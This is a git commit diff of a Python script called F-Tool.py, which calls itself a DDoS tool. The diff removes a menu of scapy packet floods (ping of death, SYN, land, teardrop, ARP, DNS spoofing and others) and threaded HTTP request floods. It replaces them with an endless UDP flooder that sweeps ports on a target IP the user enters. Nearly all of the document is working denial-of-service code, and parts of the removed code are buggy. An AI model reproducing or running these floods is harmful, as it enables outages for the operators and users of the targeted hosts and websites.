0c7e2f8f35292b5035f3778cfdc5c7a8a3ffc22e
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-22 20:27:47 +0300

    Update F-Tool.py

--- F-Tool.py
+++ F-Tool.py
@@ -37,19 +37,19 @@ from scapy.all import *
 import socket
 import threading
 import random
-import pyuseragents
 import requests
-from rainbowtext import text as rain
-import pyfiglet , colorama
+from socket import socket,AF_INET , SOCK_DGRAM,SOCK_STREAM,gaierror
+from random import _urandom
+from os import system
+from sys import exit
 
-rd = colorama.Fore.RED
-cv = colorama.Fore.WHITE
-bl = colorama.Fore.BLUE
-gn = colorama.Fore.GREEN
-yl = colorama.Fore.YELLOW
-mag = colorama.Fore.MAGENTA
-cy = colorama.Fore.CYAN
-lgn = colorama.Fore.LIGHTGREEN_EX
+#########Terminal colors################
+red = "\033[1;31m"
+blue = "\033[1;34m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+white = "\033[1;37m"
+default = "\033[0m"
 
 time.sleep(1)
 os.system("clear")
@@ -69,15 +69,6 @@ def  type(s):
 
 type("""DDos NEW METHOD""")
 time.sleep(3)
-os.system("clear")
-
-import random
-import socket
-import threading
-import time
-import os,sys
-import ssl
-import datetime
 os.system("clear")
 
 print("""
@@ -107,220 +98,70 @@ print("\033[94m")
 
 fake_ip = '77.109.33.232'
 
-rd = colorama.Fore.RED
-cv = colorama.Fore.WHITE
-bl = colorama.Fore.BLUE
-gn = colorama.Fore.GREEN
-yl = colorama.Fore.YELLOW
-mag = colorama.Fore.MAGENTA
-cy = colorama.Fore.CYAN
-lgn = colorama.Fore.LIGHTGREEN_EX
 
+
+
+def check_net_con():
+  try:
+    sock = socket(AF_INET,SOCK_STREAM)
+    sock.connect(("www.google.com",80))
+  except gaierror:
+    print(f"{red} please Check Your Internet Connection {default}")
+    exit()
+  
+######### print banner function ######
 def banner():
-    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
-    return figlet
+  global red,blue,green,yellow,white,default
+  system("clear" or "cls")
+  print(f"""{blue}
+   ______   ______   _______  _______  \n
+  (  __  \ (  __  \ (  ___  )(  ____ \ \n
+  | (  \  )| (  \  )| (   ) || (    \/ \n
+  | |   ) || |   ) || |   | || (_____  \n 
+  | |   | || |   | || |   | |(_____  ) \n
+  | |   ) || |   ) || |   | |      ) | \n
+  | (__/  )| (__/  )| (___) |/\____) | \n
+  (______/ (______/ (_______)\_______) \n
+{default}
+  """)
+  print(50 * f"{green}_{default}")
+  print("\n")
+  print(f"\t\t{green}Created By {red}ELProfessor67{default}\n")
+  print(50 * f"{green}_{default}")
+  print("\n\n")
+  
+####### we will send requests #######
+def req_send(ip,port,byte):
+  sock = socket(AF_INET,SOCK_DGRAM)
+  send = 0
+  while True:
+    sock.sendto(byte, (ip,port))
+    send += 1
+    port += 1
+    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
+    if port == 65534:
+      port = 1
 
-
-
-
-def ping_of_death(ip_target):
-    i = 0
-    while True:
-        send(IP(dst=ip_target , ttl=132 , id=1111)/ICMP()/(b"Sdadad"*8192) , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def syn_attack(ip_target):
-    i = 0
-    while True:
-        ip = IP(dst=ip_target,id=1111,ttl=99)
-        tcp = TCP(sport=RandShort() , dport=80 ,seq=12345,ack=1000,windows=1000, flags="S")
-        data = b"MRadikal" * 8192
-        send(ip / tcp / data , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def malformed_attack(ip_target):
-    i = 0
-    while True:
-        ip = IP(dst=ip_target , ihl=2 , version=3 , ttl=52 , id=112)
-        icmp = ICMP()
-        send(ip / icmp , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def land_attack(ip_target):
-    i = 0
-    while True:
-        ip = IP(dst=ip_target,src=ip_target , id=78 , ttl=92)
-        tcp = TCP(sport=135,dport=135)
-        send(ip / tcp , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-
-def nestea_attack(ip_target):
-    i =0 
-    while True:
-        ip = ip(dst=ip_target,id=42,flags="MF")
-        data = b"ZZZZ" * 1024
-        send(ip / UDP() / data , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def udp_attack(ip_target):
-    i=0
-    while True:
-        ip = IP(dst=ip_target)
-        udp = fuzz(UDP())
-        send(ip / udp , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def arp_attack(ip_target):
-    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
-    arp = ARP(psrc=RandIP , pdst=ip_target)
-    srpflood(ether / arp)
-        
-def teardrop_attack(ip_target):
-    i = 0
-    while True:
-        ip = IP(dst=ip_target,flags=0,proto=17,frags=3)
-        data = ("\x00" * 100)
-        ips = IP(dst=ip_target,flags="MF",proto=17,frag=18)
-        send(ip / data , verbose=0)
-        send(ips / data , verbose=0)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 2
-
-def dns_spoofing(ip_target):
-    i = 0
-    while True:
-        ip = IP(dst=ip_target , ttl=12)
-        udp = UDP(sport=RandShort() , dport=53)
-        dns = DNS(qd=DNSQR(qname="secdev.org",qtype="A"))
-        send(ip / udp / dns)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-
-
-
-def tcp_attack(ip_target):
-    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-    sent = 0
-    port = 80
-    while True:
-        bytes = random._urandom(1769)
-        sock.sendto(bytes, (ip_target,port))
-        sent = sent + 1
-        port = port + 1
-        print ("Sent %s packet to %s on port:%s"%(sent,ip_target,port) , end="\r")
-        if port == 65534:
-            port = 1
-
-def GET_attack(url_target):
-    useragent = pyuseragents.random()
-    header = {"User-Agent":useragent}
-    i = 0
-    while True:
-        requests.get(url_target , headers=header)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-
-def POST_attack(url_target):
-    useragent = pyuseragents.random()
-    header = {"User-Agent":useragent}
-    i = 0
-    while True:
-        requests.post(url_target , headers=header)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-
-def HEAD_attack(url_target):
-    useragent = pyuseragents.random()
-    header = {"User-Agent":useragent}
-    i = 0
-    while True:
-        requests.head(url_target , headers=header)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-def PUT_attack(url_target):
-    useragent = pyuseragents.random()
-    header = {"User-Agent":useragent}
-    print ("Sent : %s\n" % str(i) , end="\r")
-    i = 0
-    while True:
-        requests.put(url_target , headers=header)
-        print ("Sent : %s\n" % str(i))
-        i = i + 1
-def OPTIONS_attack(url_target):
-    useragent = pyuseragents.random()
-    header = {"User-Agent":useragent}
-    i = 0
-    while True:
-        requests.options(url_target , headers=header)
-        print ("Sent : %s\n" % str(i) , end="\r")
-        i = i + 1
-
-
-print(rain(banner()))
-print (rain("""
-|==============================|
-|         Black Fox            |
-|       Security Team          |
-|  Author : Maximum Radikali   |
-|    DDOSER Layer 4 , Layer 7  |
-|==============================|
-"""))
-layer = input(cy + "[-] layer4\n[-] layer7\n\n ~ Select a layer to continue -> ")
-
-if layer == "layer4":
-    ip_target = input(rd + "Please Enter Your Target IP - > ")
-    socketx = int(input(yl + "Please Enter Socket Worker ex : (10) - > "))
-    methods = input(gn + "[^] pod\n[^] syn\n[^] mfd (malformed Attack)\n[^] land\n[^] arp\n[^] nestea\n[^] dns\n[^] tear (Tear Drop Attack)\n[^] tcp\n[^] udp\n\n[~] Please Enter a method : ")
-    if methods == "pod":
-        for i in range(socketx):
-            threading.Thread(target=ping_of_death , args=(ip_target,)).start()
-    elif methods == "syn":
-        for i in range(socketx):
-            threading.Thread(target=syn_attack() , args=(ip_target,)).start()
-    elif methods == "mfd":
-        for i in range(socketx):
-            threading.Thread(target=malformed_attack , args=(ip_target,)).start()
-    elif methods == "land":
-        for i in range(socketx):
-            threading.Thread(target=land_attack , args=(ip_target,)).start()
-    elif methods == "arp":
-        print ("Attacking Start Now  .... !")
-        for i in range(socketx):
-            threading.Thread(target=arp_attack , args=(ip_target,)).start()
-    elif methods == "nestea":
-        for i in range(socketx):
-            threading.Thread(target=nestea_attack , args=(ip_target,)).start()
-    elif methods == "dns":
-        for i in range(socketx):
-            threading.Thread(target=dns_spoofing , args=(ip_target,)).start()
-    elif methods == "tear":
-        for i in range(socketx):
-            threading.Thread(target=teardrop_attack , args=(ip_target,)).start()
-    elif methods == "udp":
-        for i in range(socketx):
-            threading.Thread(target=udp_attack , args=(ip_target,)).start()
-    elif methods == "tcp":
-        for i in range(socketx):
-            threading.Thread(target=tcp_attack , args=(ip_target,)).start()
-if layer == "layer7":
-    url_target = input(bl + "[-] Please Enter Your Target URL : ")
-    worker = int(input(mag + "[=] Please Enter Your Thread Worker : "))
-    methods = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Please Enter a Method : ")
-    if methods == "GET":
-        for x in range(worker):
-            threading.Thread(target=GET_attack,args=(url_target,)).start()
-    if methods == "POST":
-        for x in range(worker):
-            threading.Thread(target=POST_attack,args=(url_target,)).start()
-    if methods == "PUT":
-        for x in range(worker):
-            threading.Thread(target=PUT_attack,args=(url_target,)).start()
-    if methods == "HEAD":
-        for x in range(worker):
-            threading.Thread(target=HEAD_attack,args=(url_target,)).start()
-    if methods == "OPTIONS":
-        for x in range(worker):
-            threading.Thread(target=OPTIONS_attack,args=(url_target,)).start()
+if __name__ == "__main__":
+  banner()
+  check_net_con()
+############ we will take input#####
+  try:
+    ip = input("\033[94m╔═══\033[91m[ Target IP ] •\n\033[94m╠══>\033[0m ")
+    port = int(input("\033[94m╠═══\033[91m[ Enter PORT ] •\n\033[94m╠══>\033[0m "))
+	
+    if not (ip == "" or port == ""):
+      byte = _urandom(1490)
+      req_send(ip,port,byte)
+    else:
+      print(f"{red}IP address and Port number is required {default}")
+      exit()
+      
+  except ValueError:
+    print(f"{red}Port number must be int not a str{default}")
+    exit()
+  except Exception as err:
+    print(f"{red}{err}{default}")
+    exit()
 #print('Atacando porta 💥')
 
